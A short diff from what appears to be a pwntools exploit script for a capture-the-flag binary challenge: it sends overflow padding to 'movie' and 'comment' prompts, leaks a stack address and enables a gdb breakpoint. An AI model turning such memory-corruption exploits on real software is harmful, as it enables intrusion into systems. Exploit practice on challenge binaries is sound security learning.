@@ -30,7 +30,7 @@ def DEBUG(cmd = "\n"):
 if __name__ == "__main__":
     io.sendafter("name: ", "M4x")
     io.sendlineafter("age: ", str(0x21212121))
-    #  DEBUG()
+    DEBUG("b *0x804878a\nc")
     io.sendafter("movie? ", '0' * 0x50)
     io.sendafter("comment: ", 'c' * 0x3c)
     survryEbp = u32(io.recvuntil("\xff")[-4: ])
